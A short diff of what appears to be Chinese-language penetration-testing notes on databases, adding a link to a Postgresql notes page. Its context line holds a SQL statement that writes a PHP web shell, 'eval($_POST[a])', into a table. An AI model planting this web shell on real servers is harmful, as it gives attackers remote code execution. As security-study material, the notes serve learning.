@@ -892,6 +892,8 @@ insert INTO shell.exp (webshell) VALUES ('<?php eval($_POST[a]);?>');
 
 ### Postgresql 基础
 
+- [Postgresql](../../../../Integrated/数据库/笔记/Postgresql.md)
+
 **忽略**
 ```sql
 SELECT 'admin' FROM users;
